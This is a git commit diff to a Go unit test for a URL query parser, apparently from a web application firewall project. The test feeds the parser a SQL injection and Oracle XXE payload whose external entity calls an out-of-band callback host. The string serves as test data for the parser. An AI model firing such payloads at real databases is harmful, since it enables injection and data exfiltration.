20c0b0366fc32b338ce4588a383799931d162bd5
Juan Pablo Tosso <jptosso@gmail.com>
2022-08-10 12:35:34 -0400

    implement new url processor

--- internal/url/url_test.go
+++ internal/url/url_test.go
@@ -20,9 +20,9 @@ import (
 
 func TestUrlPayloads(t *testing.T) {
 	out := `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`
-	_, err := ParseQuery(out, "&")
-	if err == nil {
-		t.Error("this payload should return an error")
+	q := ParseQuery(out, '&')
+	if len(q["var"]) == 0 {
+		t.Error("var is empty")
 	}
 }
 
